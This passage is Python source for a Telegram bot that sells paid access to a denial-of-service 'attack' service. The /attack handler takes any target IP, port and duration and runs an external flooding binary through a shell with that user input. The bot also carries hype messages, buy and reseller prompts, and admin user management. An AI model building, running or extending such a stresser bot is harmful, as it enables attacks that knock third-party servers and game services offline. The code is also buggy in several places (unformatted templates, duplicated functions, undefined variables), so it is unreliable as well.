                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "📝 Usage: /free_fire <IP> <PORT> <TIME>\nExample: /free_fire 20.0.0.0 8700 120\nContact an admin for help."
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nYou need proper permissions to run this command.")
        bot.send_message(message.chat.id, "DM TO BUY ACCESS :- @MR_ARMAN_OWNER ✅")
    
    bot.reply_to(message, response)
    
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER


# Function to handle the reply when users run the /attack command
def start_attack_reply(message, target, port, remaining_time):
    response = (
        "🌠 STRATEGY DEPLOYED 🌠\n\n"
        "🚀 TARGET LOCKED ON [ {target} ]... 💥\n"
        "⚔ BATTLE HAS COMMENCED ⚔\n\n"
        "🥷 ASSAULTING HOST ==) ( {target} )\n"
        "🥷 ENGAGED PORT ==) ( {port} )\n"
        "⏰ ATTACK DURATION -> {remaining_time} SECONDS 🔥\n\n"
        "💎 EXECUTED BY ARMAN TEAM ⚔\n\n"
        "THANK YOU FOR UTILIZING AUR HAX 💫\n\n"
        "ᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    )
    bot.reply_to(message, response)

    threading.Thread(target=send_countdown, args=(message.chat.id, message.message_id, remaining_time)).start()

def send_countdown(chat_id, message_id, duration):
    first_count_msg = bot.send_message(chat_id, f"⏳ REMAINING TIME: {duration} SECONDS")
    
    for remaining in range(duration - 0.7, 0, -1):
        second_count_msg = bot.send_message(chat_id, f"⏳ REMAINING TIME: {remaining} SECONDS\n\nTARGET - {target}\nport:- {port}")
        
        bot.delete_message(chat_id, first_count_msg.message_id)
        
        first_count_msg = second_count_msg
        time.sleep(1)

    bot.send_message(chat_id, "🔚 COMPLETE ✅")

def start_attack_reply(message, target, port, remaining_time):
    response = (
        "🌠 STRATEGY DEPLOYED 🌠\n\n"
        "🚀 TARGET LOCKED ON [ {target} ]... 💥\n"
        "⚔ BATTLE HAS COMMENCED ⚔\n\n"
        "🥷 ASSAULTING HOST ==) ( {target} )\n"
        "🥷 ENGAGED PORT ==) ( {port} )\n"
        "⏰ ATTACK DURATION -> {remaining_time} SECONDS 🔥\n\n"
        "💎 EXECUTED BY ARMAN TEAM ⚔\n\n"
        "THANK YOU FOR UTILIZING AUR HAX 💫\n\n"
        "ᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    )
    bot.reply_to(message, response)

    threading.Thread(target=send_countdown, args=(message.chat.id, message.message_id, remaining_time)).start()

def send_countdown(chat_id, message_id, duration):
    first_count_msg = bot.send_message(chat_id, f"⏳ REMAINING TIME: {duration} SECONDS")
    
    for remaining in range(duration - 1, 0, -1):
        second_count_msg = bot.send_message(chat_id, f"⏳ REMAINING TIME: {remaining} SECONDS")
        
        bot.delete_message(chat_id, first_count_msg.message_id)
        
        first_count_msg = second_count_msg
        time.sleep(1)

    bot.send_message(chat_id, "🔚 Countdown complete!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in approved_users:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            
            if time > 300:
                response = "⚠️ Error: Time interval must be less than 300 seconds.\n🔍 Check your input and adjust accordingly."
                bot.reply_to(message, response)
                return
            
            start_attack_reply(message, target, port, time)
            full_command = f"./JUPITER {target} {port} {time}"
            subprocess.run(full_command, shell=True)
            
            response = (
                "⚠️ TARGET DETAILS ⚠️\n\n"
                "✅ ATTACK FINISHED\n"
                "🔍 TARGET: {target}\n"
                "🔌 PORT: {port}\n"
                "🕒 TIME: {time} seconds\n\n"
                "🔥 The storm has passed. Watch for what comes next!\n"
                "👁️ Stay vigilant, the dawn of chaos may bring unexpected replies!"
            )
            bot.send_message(message.chat.id, response)
        else:
            response = (
                "📝 ERROR: Invalid command format!\n"
                "Usage: /attack <target> <port> <time>\n"
                "Example: /attack 192.168.1.1 80 10"
            )
            bot.reply_to(message, response)
    else:
        response = "🚫 You are not authorized to use this command!"
        bot.reply_to(message, response)

#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['help'])
def send_help_message(message):
    bot.send_message(message.chat.id, "It seems like you would like more information! Here’s what each command does")
    time.sleep(0.5)  # Wait for 0.5 seconds

    bot.send_message(message.chat.id, "💥 /free_fire : Initiate an attack on your target. Be prepared for the results! 🚀")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /rules : Review the rules to understand the guidelines and regulations of the platform. ⚖️")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /mylogs : Check your activity logs to track your actions and engagements. 📜")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /plan : Explore the different plans available to enhance your experience. 🌟")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /myinfo : Access details about your account, including settings and status. 🔍")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "💥 /admincmd : (Admins only) View all available commands meant for admin users. 📋")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "If you need any specific command to be executed or further information, just let me know!")
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER

# gali mat de be itna mehnst karke script banaya hai credit to lunga 😂

#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)



#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🎉 Welcome to the Bot! It's now online! ✅")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "👑 Owner of this bot is the one and only: @MR_ARMAN_OWNER")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "⚔️ Are you ready for adventure? Type /free_fire or /help for assistance!")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "🌟 Want to unlock exclusive features? Run /plan to become a PREMIUM MEMBER!")
    time.sleep(0.2)
    bot.send_message(message.chat.id, "🚀 Let's get started and make the most out of your experience!")

    response = "Welcome to the bot! Choose an option below:"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("❤️‍🩹 CONTACT OWNER ❤️‍🩹", url="https://t.me/MR_ARMAN_OWNER"),
        types.InlineKeyboardButton("📞 SUPPORT CHAT 📞", url="https://t.me/YOUR_SUPPORT_CHAT_LINK")
    )
    bot.send_message(message.chat.id, response, reply_markup=keyboard)

    # Create buttons for user interaction
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    attack_button = types.KeyboardButton("attack")
    contact_button = types.KeyboardButton("Contact Owner")
    check_status_button = types.KeyboardButton("my info")
    buy_button = types.KeyboardButton("Buy")
    reselling_panel_button = types.KeyboardButton("Reselling Panel")
    referral_link_button = types.KeyboardButton("Referral Link")
    how_to_use_button = types.KeyboardButton("HOW TO USE")
    
    markup.add(attack_button, contact_button, check_status_button, buy_button, reselling_panel_button, referral_link_button, how_to_use_button)
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "attack")
def attack_function(message):
    bot.send_message(message.chat.id, "USAGE: /free_fire <IP> <PORT> <TIME>")

@bot.message_handler(func=lambda message: message.text == "Contact Owner")
def contact_owner(message):
    bot.send_message(message.chat.id, "You can contact the owner at @MR_ARMAN_OWNER")

@bot.message_handler(func=lambda message: message.text == "my info")
def check_status(message):
    bot.send_message(message.chat.id, "CHECKING YOUR WHOLE INFO... PLEASE WAIT!")  
    time.sleep(3)
    user_info = (
        "HERE'S YOUR INFO...\n\n"
        f"Username: @{message.from_user.username}\n"
        f"User ID: {message.from_user.id}\n"
        f"First Name: {message.from_user.first_name}\n"
        f"Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}\n\n"
        "Last Seen: (This information is not available due to privacy settings)\n"
        "Status: (This information is not available)\n"
        f"Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}\n"
        f"Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}"
    )
    bot.send_message(message.chat.id, user_info)

@bot.message_handler(func=lambda message: message.text == "Buy")
def buy_function(message):
    bot.send_message(message.chat.id, "🌟 Thank you for your interest! Please follow the instructions to proceed.")

    #script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['admincmd'])
def welcome_message(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝘼𝙇𝙀𝙍𝙏 ⚠️‼️\n𝙏𝙃𝙄𝙎 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙁𝙍𝙊𝙈 :--> 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 ✅:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER